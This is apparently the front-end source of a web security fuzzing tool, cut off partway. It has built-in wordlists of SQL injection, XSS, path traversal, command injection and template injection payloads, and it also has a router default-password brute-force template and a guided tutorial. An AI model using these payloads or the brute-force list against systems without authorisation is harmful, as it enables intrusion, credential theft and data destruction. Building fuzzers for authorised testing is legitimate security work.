import React, { useState, useCallback, useRef, useEffect } from "react";
import {
  Box,
  Typography,
  Card,
  CardContent,
  Grid,
  Button,
  ButtonGroup,
  TextField,
  Tabs,
  Tab,
  Paper,
  Chip,
  Alert,
  CircularProgress,
  alpha,
  useTheme,
  Tooltip,
  IconButton,
  Select,
  MenuItem,
  Menu,
  FormControl,
  InputLabel,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  LinearProgress,
  Checkbox,
  FormControlLabel,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Divider,
  Badge,
  Dialog,
  DialogTitle,
  DialogContent,
  DialogActions,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Switch,
  Collapse,
  Stepper,
  Step,
  StepLabel,
  StepContent,
  InputAdornment,
} from "@mui/material";
import { Link, useNavigate } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import StopIcon from "@mui/icons-material/Stop";
import PauseIcon from "@mui/icons-material/Pause";
import RefreshIcon from "@mui/icons-material/Refresh";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import ExpandLessIcon from "@mui/icons-material/ExpandLess";
import OpenInFullIcon from "@mui/icons-material/OpenInFull";
import CloseFullscreenIcon from "@mui/icons-material/CloseFullscreen";
import AddIcon from "@mui/icons-material/Add";
import DeleteIcon from "@mui/icons-material/Delete";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import DownloadIcon from "@mui/icons-material/Download";
import UploadIcon from "@mui/icons-material/Upload";
import FilterListIcon from "@mui/icons-material/FilterList";
import BugReportIcon from "@mui/icons-material/BugReport";
import SecurityIcon from "@mui/icons-material/Security";
import SpeedIcon from "@mui/icons-material/Speed";
import FolderIcon from "@mui/icons-material/Folder";
import HttpIcon from "@mui/icons-material/Http";
import DataObjectIcon from "@mui/icons-material/DataObject";
import TextFieldsIcon from "@mui/icons-material/TextFields";
import WarningAmberIcon from "@mui/icons-material/WarningAmber";
import WarningIcon from "@mui/icons-material/Warning";
import CheckCircleIcon from "@mui/icons-material/CheckCircle";
import ErrorIcon from "@mui/icons-material/Error";
import InfoIcon from "@mui/icons-material/Info";
import ListAltIcon from "@mui/icons-material/ListAlt";
import SchoolIcon from "@mui/icons-material/School";
import ChatIcon from "@mui/icons-material/Chat";
import SmartToyIcon from "@mui/icons-material/SmartToy";
import CodeIcon from "@mui/icons-material/Code";
import ArticleIcon from "@mui/icons-material/Article";
import PictureAsPdfIcon from "@mui/icons-material/PictureAsPdf";
import DescriptionIcon from "@mui/icons-material/Description";
import SaveIcon from "@mui/icons-material/Save";
import FolderOpenIcon from "@mui/icons-material/FolderOpen";
import VisibilityIcon from "@mui/icons-material/Visibility";
import SendIcon from "@mui/icons-material/Send";
import AccessTimeIcon from "@mui/icons-material/AccessTime";
import PersonIcon from "@mui/icons-material/Person";
import AutoFixHighIcon from "@mui/icons-material/AutoFixHigh";
import TipsAndUpdatesIcon from "@mui/icons-material/TipsAndUpdates";
import AssessmentIcon from "@mui/icons-material/Assessment";
import BuildIcon from "@mui/icons-material/Build";
import ShieldIcon from "@mui/icons-material/Shield";
import SearchIcon from "@mui/icons-material/Search";
import AutorenewIcon from "@mui/icons-material/Autorenew";
import CategoryIcon from "@mui/icons-material/Category";
import HelpOutlineIcon from "@mui/icons-material/HelpOutline";
import RocketLaunchIcon from "@mui/icons-material/RocketLaunch";
import NavigateNextIcon from "@mui/icons-material/NavigateNext";
import NavigateBeforeIcon from "@mui/icons-material/NavigateBefore";
import CheckIcon from "@mui/icons-material/Check";
import LightbulbIcon from "@mui/icons-material/Lightbulb";
import TimerIcon from "@mui/icons-material/Timer";
import BlockIcon from "@mui/icons-material/Block";
import ClearIcon from "@mui/icons-material/Clear";
import CableIcon from "@mui/icons-material/Cable";
import PieChartIcon from "@mui/icons-material/PieChart";
import GridOnIcon from "@mui/icons-material/GridOn";
import RadarIcon from "@mui/icons-material/Radar";
import ReactMarkdown from "react-markdown";
import { ChatCodeBlock } from "../components/ChatCodeBlock";
import { fuzzer, FuzzerResponse, FuzzerConfig as APIFuzzerConfig } from "../api/client";
import { jsPDF } from "jspdf";
import { 
  Document as DocxDocument, 
  Packer, 
  Paragraph, 
  TextRun, 
  HeadingLevel, 
  Table as DocxTable, 
  TableRow as DocxTableRow, 
  TableCell as DocxTableCell, 
  WidthType, 
  BorderStyle, 
  AlignmentType 
} from "docx";
import { saveAs } from "file-saver";

// Types
interface FuzzResult {
  id: string;
  payload: string;
  statusCode: number;
  responseLength: number;
  responseTime: number;
  contentType: string;
  headers: Record<string, string>;
  body?: string;
  timestamp: Date;
  error?: string;
  interesting: boolean;
  flags: string[];
}

interface ChatMessage {
  role: "user" | "assistant";
  content: string;
}

interface AIAnalysis {
  summary: string;
  riskLevel: "critical" | "high" | "medium" | "low" | "info";
  findings: {
    type: string;
    severity: string;
    description: string;
    evidence: string[];
    recommendation: string;
  }[];
  patterns: string[];
  recommendations: string[];
}

interface WordlistConfig {
  name: string;
  description: string;
  category: string;
  count: number;
  sample: string[];
}

interface SavedConfig {
  id: string;
  name: string;
  description: string;
  config: FuzzConfig;
  savedAt: string;
}

interface FuzzConfig {
  targetUrl: string;
  method: string;
  headers: Record<string, string>;
  body: string;
  positions: string[];
  payloads: string[][];
  attackMode: "sniper" | "batteringram" | "pitchfork" | "clusterbomb";
  threads: number;
  delay: number;
  timeout: number;
  followRedirects: boolean;
  matchCodes: number[];
  filterCodes: number[];
  matchSize: { min: number; max: number } | null;
  matchRegex: string;
  proxyUrl: string;
}

const FUZZER_HANDOFF_KEY = "vragent-fuzzer-handoff";

// Built-in wordlists
const BUILTIN_WORDLISTS: WordlistConfig[] = [
  {
    name: "Common Directories",
    description: "Most common web directories for initial enumeration",
    category: "directories",
    count: 50,
    sample: ["admin", "api", "backup", "config", "dashboard", "db", "debug", "dev", "docs", "files", "images", "include", "js", "lib", "log", "login", "media", "old", "php", "private", "public", "scripts", "static", "system", "temp", "test", "tmp", "upload", "user", "vendor", "wp-admin", "wp-content", "wp-includes", ".git", ".svn", ".env", "robots.txt", "sitemap.xml", "crossdomain.xml", "phpinfo.php", "info.php", "server-status", "server-info", "elmah.axd", "trace.axd", "web.config", "applicationhost.config", ".htaccess", ".htpasswd", "cgi-bin"],
  },
  {
    name: "Common Files",
    description: "Common sensitive files and configurations",
    category: "files",
    count: 40,
    sample: [".env", ".env.local", ".env.production", ".env.development", "config.php", "config.yml", "settings.py", "database.yml", "secrets.yml", "credentials.xml", "web.config", "app.config", "package.json", "composer.json", "Gemfile", "requirements.txt", "Dockerfile", "docker-compose.yml", ".gitignore", ".dockerignore", "README.md", "CHANGELOG.md", "LICENSE", "Makefile", "gulpfile.js", "webpack.config.js", "tsconfig.json", ".babelrc", ".eslintrc", "jest.config.js", "phpunit.xml", "pom.xml", "build.gradle", "settings.gradle", "Cargo.toml", "go.mod", "go.sum", "yarn.lock", "package-lock.json", "Pipfile.lock"],
  },
  {
    name: "SQL Injection",
    description: "Common SQL injection payloads",
    category: "sqli",
    count: 35,
    sample: ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "admin'--", "') OR ('1'='1", "1' ORDER BY 1--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--", "'; DROP TABLE users--", "' AND 1=1--", "' AND 1=2--", "1 AND 1=1", "1 AND 1=2", "' WAITFOR DELAY '0:0:5'--", "'; WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "1' AND SLEEP(5)--", "' OR SLEEP(5)--", "SLEEP(5)#", "1 OR SLEEP(5)#", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "' AND BENCHMARK(10000000,MD5('test'))--", "pg_sleep(5)--", "'; SELECT pg_sleep(5);--", "1; SELECT pg_sleep(5);--", "' || pg_sleep(5)--", "DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", "RANDOMBLOB(500000000/2)"],
  },
  {
    name: "XSS Payloads",
    description: "Cross-site scripting test payloads",
    category: "xss",
    count: 40,
    sample: ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>", "javascript:alert('XSS')", "<body onload=alert('XSS')>", "<iframe src=\"javascript:alert('XSS')\">", "<input onfocus=alert('XSS') autofocus>", "<marquee onstart=alert('XSS')>", "<video><source onerror=alert('XSS')>", "<audio src=x onerror=alert('XSS')>", "<details open ontoggle=alert('XSS')>", "<math><mtext><annotation-xml><foreignObject><script>alert('XSS')</script>", "\"><script>alert('XSS')</script>", "'-alert('XSS')-'", "';alert('XSS')//", "</title><script>alert('XSS')</script>", "</textarea><script>alert('XSS')</script>", "<scr<script>ipt>alert('XSS')</scr</script>ipt>", "%3Cscript%3Ealert('XSS')%3C/script%3E", "&#60;script&#62;alert('XSS')&#60;/script&#62;", "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e", "<img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;('XSS')\">", "<svg/onload=alert('XSS')>", "<body/onload=alert('XSS')>", "<img/src=x onerror=alert('XSS')>", "{{constructor.constructor('alert(1)')()}}", "${alert('XSS')}", "#{alert('XSS')}", "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>", "<svg><script>alert('XSS')</script></svg>", "<math><mi xlink:href=\"javascript:alert('XSS')\">", "<a href=\"javascript:alert('XSS')\">Click</a>", "<form action=\"javascript:alert('XSS')\"><input type=submit>", "<isindex action=\"javascript:alert('XSS')\" type=submit value=click>", "<object data=\"javascript:alert('XSS')\">", "<embed src=\"javascript:alert('XSS')\">", "<base href=\"javascript:alert('XSS')\">", "<link rel=\"import\" href=\"data:text/html,<script>alert('XSS')</script>\">", "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">", "<a href=\"data:text/html,<script>alert('XSS')</script>\">"],
  },
  {
    name: "Path Traversal",
    description: "Directory traversal payloads",
    category: "lfi",
    count: 30,
    sample: ["../", "..\\", "../../../etc/passwd", "..\\..\\..\\windows\\system32\\config\\sam", "....//....//....//etc/passwd", "..%252f..%252f..%252fetc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "..%c0%af..%c0%af..%c0%afetc/passwd", "..%255c..%255c..%255cwindows\\system32\\config\\sam", "/etc/passwd", "/etc/shadow", "/etc/hosts", "/proc/self/environ", "/var/log/apache2/access.log", "/var/log/nginx/access.log", "C:\\Windows\\System32\\config\\SAM", "C:\\Windows\\System32\\drivers\\etc\\hosts", "C:\\inetpub\\wwwroot\\web.config", "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam", "....//....//....//....//etc/passwd", "%00", "../../../../../../etc/passwd%00", "../../../../../../etc/passwd%00.jpg", "file:///etc/passwd", "php://filter/convert.base64-encode/resource=index.php", "php://input", "expect://id", "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=", "phar://", "zip://"],
  },
  {
    name: "Command Injection",
    description: "OS command injection payloads",
    category: "cmdi",
    count: 25,
    sample: ["; ls -la", "| ls -la", "& ls -la", "&& ls -la", "|| ls -la", "`ls -la`", "$(ls -la)", "; cat /etc/passwd", "| cat /etc/passwd", "& cat /etc/passwd", "; id", "| id", "& id", "| whoami", "; whoami", "& whoami", "%0aid", "%0a cat /etc/passwd", "; ping -c 5 127.0.0.1", "| ping -c 5 127.0.0.1", "& ping -n 5 127.0.0.1", "; sleep 5", "| sleep 5", "& timeout 5", "$(sleep 5)"],
  },
  {
    name: "SSTI Payloads",
    description: "Server-side template injection payloads",
    category: "ssti",
    count: 20,
    sample: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}", "@(7*7)", "{{config}}", "{{config.items()}}", "{{self.__class__.__mro__[2].__subclasses__()}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", "${T(java.lang.Runtime).getRuntime().exec('id')}", "<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }", "{php}echo `id`;{/php}", "{system('id')}", "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}", "@Runtime@getRuntime().exec('id')", "{{this.constructor.constructor('return this.process.mainModule.require(\"child_process\").execSync(\"id\")')()}}", "${{<%[%'\"}}%\\."],
  },
  {
    name: "API Parameters",
    description: "Common API parameter names",
    category: "params",
    count: 50,
    sample: ["id", "user_id", "userId", "user", "username", "name", "email", "password", "pass", "pwd", "token", "api_key", "apiKey", "key", "secret", "auth", "authorization", "session", "sessionId", "session_id", "access_token", "refresh_token", "page", "limit", "offset", "sort", "order", "filter", "query", "q", "search", "keyword", "type", "category", "status", "state", "action", "method", "format", "callback", "redirect", "url", "file", "path", "dir", "filename", "data", "content", "body", "message"],
  },
  {
    name: "HTTP Methods",
    description: "HTTP method fuzzing",
    category: "methods",
    count: 15,
    sample: ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS", "TRACE", "CONNECT", "PROPFIND", "PROPPATCH", "MKCOL", "COPY", "MOVE", "LOCK"],
  },
  {
    name: "User Agents",
    description: "Various user agent strings for testing",
    category: "useragents",
    count: 20,
    sample: [
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
      "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
      "Mozilla/5.0 (Android 10; Mobile; rv:91.0)",
      "curl/7.68.0",
      "Wget/1.20.3",
      "python-requests/2.25.1",
      "Go-http-client/1.1",
      "Apache-HttpClient/4.5.12",
      "PostmanRuntime/7.28.0",
      "Googlebot/2.1 (+http://www.google.com/bot.html)",
      "Bingbot/2.0 (+http://www.bing.com/bingbot.htm)",
      "facebookexternalhit/1.1",
      "Twitterbot/1.0",
      "Slackbot-LinkExpanding 1.0",
      "WhatsApp/2.21.4.22",
      "Discordbot/2.0",
      "TelegramBot (like TwitterBot)",
      "LinkedInBot/1.0",
    ],
  },
];

// Attack mode explanations
const ATTACK_MODES = {
  sniper: {
    name: "Sniper",
    icon: "🎯",
    description: "Tests each payload position one at a time with each payload. Best for single parameter testing.",
    example: "Position 1: payload1, payload2... then Position 2: payload1, payload2...",
  },
  batteringram: {
    name: "Battering Ram",
    icon: "🔨",
    description: "Uses the same payload in all positions simultaneously. Good for testing same value everywhere.",
    example: "All positions: payload1, then all: payload2...",
  },
  pitchfork: {
    name: "Pitchfork",
    icon: "🔱",
    description: "Tests payloads in parallel - position 1 gets payload set 1, position 2 gets payload set 2, etc.",
    example: "Position 1: set1[0], Position 2: set2[0] → Position 1: set1[1], Position 2: set2[1]...",
  },
  clusterbomb: {
    name: "Cluster Bomb",
    icon: "💣",
    description: "Tests all combinations of payloads across all positions. Most thorough but generates many requests.",
    example: "Every combination: set1 × set2 × set3...",
  },
};

// Quick-start scenario templates
const SCENARIO_TEMPLATES = {
  routerDiscovery: {
    name: "🌐 Router Directory Discovery",
    description: "Find hidden pages and admin panels on routers/devices",
    config: {
      method: "GET",
      targetUrl: "http://192.168.1.1/FUZZ",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    },
    payloads: [
      "admin", "login", "index.html", "index.htm", "setup", "config", "management",
      "cgi-bin", "userRpm", "HNAP1", "api", "status", "system", "network", "wireless",
      "security", "firmware", "backup", "password", "goform", "stok", "webpages",
      "admin.html", "login.html", "main.html", "home.html", "index.php", "admin.php"
    ],
    tips: "Start with this to discover what pages exist. Look for 200/301/401/403 responses.",
  },
  routerLogin: {
    name: "🔐 Router Login Brute Force",
    description: "Test common default credentials on router login pages",
    config: {
      method: "POST",
      targetUrl: "http://192.168.1.1/login",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: "username=admin&password=FUZZ",
    },
    payloads: [
      "admin", "password", "1234", "12345", "123456", "root", "user", "guest",
      "default", "router", "cisco", "linksys", "netgear", "dlink", "tplink", "asus",
      "admin123", "password123", "letmein", "welcome", "passw0rd", ""
    ],
    tips: "Watch for different response sizes - successful logins often have different page lengths.",
  },
  apiEndpoints: {
    name: "🔌 API Endpoint Discovery",
    description: "Find hidden API endpoints and methods",
    config: {
      method: "GET",
      targetUrl: "http://target.com/api/FUZZ",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "application/json"
      },
    },
    payloads: [
      "users", "admin", "config", "settings", "status", "health", "version", "info",
      "login", "logout", "register", "auth", "token", "profile", "account", "data",
      "v1", "v2", "v3", "internal", "private", "debug", "test", "swagger", "docs"
    ],
    tips: "Try different HTTP methods (GET/POST/PUT/DELETE) on discovered endpoints.",
  },
  idorTest: {
    name: "🆔 IDOR Testing (ID Enumeration)",
    description: "Test for Insecure Direct Object References by enumerating IDs",
    config: {
      method: "GET",
      targetUrl: "http://target.com/api/users/FUZZ",
      headers: { 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Authorization": "Bearer YOUR_TOKEN_HERE"
      },
    },
    payloads: Array.from({length: 100}, (_, i) => String(i + 1)),
    tips: "Replace YOUR_TOKEN_HERE with your auth token. Look for responses that return other users' data.",
  },
  sqlInjection: {
    name: "💉 SQL Injection Testing",
    description: "Test parameters for SQL injection vulnerabilities",
    config: {
      method: "GET",
      targetUrl: "http://target.com/search?q=FUZZ",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    },
    payloads: [
      "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
      "'; DROP TABLE users--", "1' AND '1'='1", "1 AND 1=1", "1' AND '1'='2",
      "' UNION SELECT NULL--", "' UNION SELECT 1,2,3--", "1; WAITFOR DELAY '0:0:5'--",
      "1' AND SLEEP(5)#", "admin'--", "1 OR 1=1", "' OR ''='", "-1 OR 1=1"
    ],
    tips: "Look for SQL errors in responses, different response sizes, or time delays.",
  },
  xssTest: {
    name: "⚡ XSS Testing",
    description: "Test for Cross-Site Scripting vulnerabilities",
    config: {
      method: "GET",
      targetUrl: "http://target.com/search?q=FUZZ",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    },
    payloads: [
      "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
      "javascript:alert(1)", "'><script>alert(1)</script>", "\"><script>alert(1)</script>",
      "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>", "'-alert(1)-'",
      "<iframe src=javascript:alert(1)>", "<marquee onstart=alert(1)>", "{{constructor.constructor('alert(1)')()}}"
    ],
    tips: "Check if your payload appears in the response HTML. Look for reflected/stored XSS.",
  },
  pathTraversal: {
    name: "📂 Path Traversal Testing",
    description: "Test for directory traversal vulnerabilities",
    config: {
      method: "GET",
      targetUrl: "http://target.com/file?name=FUZZ",
      headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
    },
    payloads: [
      "../etc/passwd", "../../etc/passwd", "../../../etc/passwd", "..\\..\\windows\\win.ini",
      "....//....//etc/passwd", "%2e%2e%2f%2e%2e%2fetc/passwd", "..%252f..%252fetc/passwd",
      "/etc/passwd", "C:\\Windows\\System32\\drivers\\etc\\hosts", "..\\..\\..\\windows\\system32\\config\\sam"
    ],
    tips: "Look for file contents in responses (e.g., 'root:x:0:0:' for /etc/passwd).",
  },
};

// Common header presets
const HEADER_PRESETS = [
  { name: "Browser User-Agent", header: "User-Agent", value: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" },
  { name: "JSON Content-Type", header: "Content-Type", value: "application/json" },
  { name: "Form Content-Type", header: "Content-Type", value: "application/x-www-form-urlencoded" },
  { name: "Accept JSON", header: "Accept", value: "application/json" },
  { name: "Accept HTML", header: "Accept", value: "text/html,application/xhtml+xml" },
  { name: "No Cache", header: "Cache-Control", value: "no-cache" },
  { name: "XMLHttpRequest", header: "X-Requested-With", value: "XMLHttpRequest" },
];

// Interactive Wizard Steps Configuration
const WIZARD_STEPS = [
  {
    id: "welcome",
    title: "Welcome to the Security Fuzzer! 🚀",
    description: "This wizard will guide you through your first fuzzing session step-by-step.",
    longDescription: `**What is Fuzzing?**

Fuzzing is a security testing technique where you send many different inputs (called "payloads") to an application to find vulnerabilities.

**What you'll learn:**
1. How to configure a target URL
2. How to mark positions for payload injection
3. How to select and load payloads
4. How to run a fuzzing session
5. How to analyze the results

**Let's get started!**`,
    tip: "Don't worry if this seems complex - we'll explain everything as we go!",
    validation: () => true,
    validationMessage: "",
  },
  {
    id: "target",
    title: "Step 1: Configure Your Target",
    description: "Enter the URL you want to test. This is the endpoint that will receive the payloads.",
    longDescription: `**Enter a Target URL**

This is the web address you want to test. It could be:
- An API endpoint: \`http://192.168.1.1/api/users\`
- A login page: \`http://target.com/login\`
- A search page: \`http://example.com/search?q=test\`

**Example targets for practice:**
- \`http://192.168.1.1/FUZZ\` - Test different paths
- \`http://example.com/api/users/FUZZ\` - Test user IDs
- \`http://target.com/search?query=FUZZ\` - Test search input

**Important:** Use \`FUZZ\` or \`§0§\` where you want payloads injected.`,
    tip: "💡 Pro tip: The 'FUZZ' keyword marks where payloads will be inserted. You can also use §0§, §1§, etc. for multiple positions.",
    validation: (config: FuzzConfig) => config.targetUrl.length > 0,
    validationMessage: "Please enter a target URL to continue",
  },
  {
    id: "positions",
    title: "Step 2: Mark Injection Positions",
    description: "Positions tell the fuzzer WHERE to inject payloads in your request.",
    longDescription: `**What are Injection Positions?**

Positions are markers in your URL or request body where the fuzzer will insert test payloads.

**Two ways to mark positions:**

1. **Using FUZZ keyword** (simplest):
   - URL: \`http://192.168.1.1/FUZZ\`
   - The word FUZZ gets replaced with each payload
   
2. **Using numbered markers** (for multiple positions):
   - URL: \`http://192.168.1.1/api/§0§?token=§1§\`
   - §0§ = first set of payloads
   - §1§ = second set of payloads

**Examples:**
| URL | What it tests |
|-----|---------------|
| \`/api/users/FUZZ\` | Different user IDs |
| \`/§0§/config\` | Different directories |
| \`?id=§0§&page=§1§\` | Multiple parameters |`,
    tip: "💡 If you used 'FUZZ' in your URL, click 'Auto-detect FUZZ position' to automatically set it up!",
    validation: (config: FuzzConfig) => config.positions.length > 0 || config.targetUrl.includes("FUZZ"),
    validationMessage: "Add at least one injection position (or use FUZZ in your URL)",
  },
  {
    id: "payloads",
    title: "Step 3: Load Your Payloads",
    description: "Payloads are the values that will be tested at each position.",
    longDescription: `**What are Payloads?**

Payloads are the test values sent to your target. They can be:
- Directory names: admin, backup, config
- User IDs: 1, 2, 3, 4, 5
- Attack strings: ' OR 1=1--, <script>alert(1)</script>

**Three ways to add payloads:**

1. **Use Built-in Wordlists** (Recommended for beginners):
   - Common Directories - for finding hidden pages
   - SQL Injection - for testing databases
   - XSS Payloads - for cross-site scripting tests

2. **Enter Custom Payloads**:
   - Type one payload per line
   - Great for specific values you want to test

3. **Upload a File**:
   - Load your own wordlist (.txt file)
   - One payload per line`,
    tip: "💡 Start with 'Common Directories' wordlist - it's safe and useful for beginners!",
    validation: (config: FuzzConfig) => config.payloads.some(p => p.length > 0),
    validationMessage: "Load at least one payload list to continue",
  },
  {
    id: "attackmode",
    title: "Step 4: Choose Attack Mode",
    description: "Attack mode determines how payloads are combined when testing multiple positions.",
    longDescription: `**Attack Modes Explained:**

**🎯 Sniper** (Best for beginners)
- Tests ONE position at a time
- Other positions stay static
- Example: If you have 10 payloads and 2 positions = 20 requests
- Use when: Testing a single parameter

**🔨 Battering Ram**
- Uses SAME payload in ALL positions simultaneously
- Example: 10 payloads = 10 requests
- Use when: Testing same value everywhere (like a username)

**🎸 Pitchfork**
- Pairs payloads from each position 1:1
- Position 1 payload 1 + Position 2 payload 1, etc.
- Use when: Testing related values (username + password pairs)

**💣 Cluster Bomb**
- Tests EVERY combination of payloads
- Example: 10 payloads × 10 payloads = 100 requests
- Use when: Exhaustive testing (warning: can be slow!)`,
    tip: "💡 Stick with 'Sniper' mode for your first test - it's the simplest and most efficient!",
    validation: () => true,
    validationMessage: "",
  },
  {
    id: "run",
    title: "Step 5: Start Fuzzing! 🎉",
    description: "You're ready to run your first fuzzing session!",
    longDescription: `**Final Checklist:**

✅ Target URL is set
✅ Injection positions are marked
✅ Payloads are loaded
✅ Attack mode is selected

**What happens when you click Start:**

1. The fuzzer sends requests to your target
2. Each request uses a different payload
3. Responses are analyzed in real-time
4. Interesting responses are flagged

**What to look for in results:**
- **Different status codes** - 200 vs 403 vs 404
- **Different response lengths** - May indicate different behavior
- **Different response times** - Slow responses might mean vulnerability
- **Interesting flags** - Auto-detected patterns

**After fuzzing:**
- Use AI Analysis for automated insights
- Check the Smart Detection tab for vulnerabilities
- Export your findings as a report`,
    tip: "💡 Watch the progress bar and response table as requests are made. Look for responses that stand out!",
    validation: () => true,
    validationMessage: "",
  },
];

// Contextual Help Tooltips Data
const CONTEXTUAL_HELP = {
  targetUrl: {
    title: "Target URL",
    description: "The web address you want to test. Use 'FUZZ' or '§0§' to mark where payloads should be inserted.",
    example: "http://192.168.1.1/api/users/FUZZ",
    tip: "Use http:// for local networks, https:// for secure connections",
  },
  method: {
    title: "HTTP Method",
    description: "The type of request to send. GET is for retrieving data, POST for sending data.",
    example: "GET for directory enumeration, POST for form testing",
    tip: "Most web pages use GET, APIs often use POST, PUT, DELETE",
  },
  threads: {
    title: "Concurrent Threads",
    description: "How many requests to send simultaneously. Higher = faster but may trigger rate limiting.",
    example: "10 threads = 10 requests at once",
    tip: "Start with 10, increase if target can handle it",
  },
  delay: {
    title: "Delay Between Requests",
    description: "Milliseconds to wait between each request. Helps avoid detection and rate limiting.",
    example: "100ms = 10 requests per second max",
    tip: "Use 100-500ms for stealthy testing",
  },
  timeout: {
    title: "Request Timeout",
    description: "How long to wait for a response before giving up (in milliseconds).",
    example: "10000ms = 10 seconds",
    tip: "Increase for slow servers, decrease for faster scanning",
  },
  attackMode: {
    title: "Attack Mode",
    description: "How payloads are combined when you have multiple injection positions.",
    example: "Sniper = test one position at a time",
    tip: "Use Sniper for simple tests, Cluster Bomb for exhaustive testing",
  },
  positions: {
    title: "Injection Positions",
    description: "Markers in your URL or body where payloads will be inserted.",
    example: "§0§ = first position, §1§ = second position",
    tip: "Use FUZZ for a single position, numbered markers for multiple",
  },
  payloads: {
    title: "Payloads",
    description: "The test values to send. Can be wordlists, custom values, or generated sequences.",
    example: "admin, root, test, user, backup...",
    tip: "Start with built-in wordlists, then customize based on results",
  },
  proxyUrl: {
    title: "Proxy URL",
    description: "Route requests through a proxy like Burp Suite or ZAP for inspection.",
    example: "http://127.0.0.1:8080",
    tip: "Great for debugging or manual inspection of interesting requests",
  },
  matchCodes: {
    title: "Match Status Codes",
    description: "Only show responses with these HTTP status codes.",
    example: "200, 301, 403, 500",
    tip: "403 often indicates a protected page exists, 500 might mean a vulnerability",
  },
};

// Helper component for contextual help
const HelpTooltip: React.FC<{ field: keyof typeof CONTEXTUAL_HELP; showHelp?: boolean }> = ({ field, showHelp = true }) => {
  const help = CONTEXTUAL_HELP[field];
  if (!showHelp || !help) return null;
  
  return (
    <Tooltip
      arrow
      placement="top"
      title={
        <Box sx={{ p: 0.5, maxWidth: 300 }}>
          <Typography variant="subtitle2" fontWeight={700} gutterBottom>
            {help.title}
          </Typography>
          <Typography variant="body2" sx={{ mb: 1 }}>
            {help.description}
          </Typography>
          {help.example && (
            <Typography variant="caption" sx={{ display: "block", fontFamily: "monospace", bgcolor: "rgba(0,0,0,0.2)", p: 0.5, borderRadius: 0.5, mb: 1 }}>
              Example: {help.example}
            </Typography>
          )}
          <Typography variant="caption" color="warning.light" sx={{ display: "flex", alignItems: "center", gap: 0.5 }}>
            <LightbulbIcon sx={{ fontSize: 14 }} /> {help.tip}
          </Typography>
        </Box>
      }
    >
      <IconButton size="small" sx={{ ml: 0.5, opacity: 0.6, "&:hover": { opacity: 1 } }}>
        <HelpOutlineIcon sx={{ fontSize: 16 }} />
      </IconButton>
    </Tooltip>
  );
};

const FuzzingPage: React.FC = () => {
  const theme = useTheme();
  const [activeTab, setActiveTab] = useState(0);
  
  // Fuzzing state
  const [config, setConfig] = useState<FuzzConfig>({
    targetUrl: "",
    method: "GET",
    headers: { "User-Agent": "VRAgent-Fuzzer/1.0" },
    body: "",
    positions: [],
    payloads: [[]],
    attackMode: "sniper",
    threads: 10,
    delay: 0,
    timeout: 10000,
    followRedirects: true,
    matchCodes: [200, 301, 302, 401, 403],
    filterCodes: [],
    matchSize: null,
    matchRegex: "",
    proxyUrl: "",
  });

  useEffect(() => {
    const stored = localStorage.getItem(FUZZER_HANDOFF_KEY);
    if (!stored) return;
    try {
      const payload = JSON.parse(stored);
      if (payload?.targetUrl) {
        setConfig(prev => ({
          ...prev,
          targetUrl: payload.targetUrl,
          method: payload.method || prev.method,
          headers: payload.headers || prev.headers,
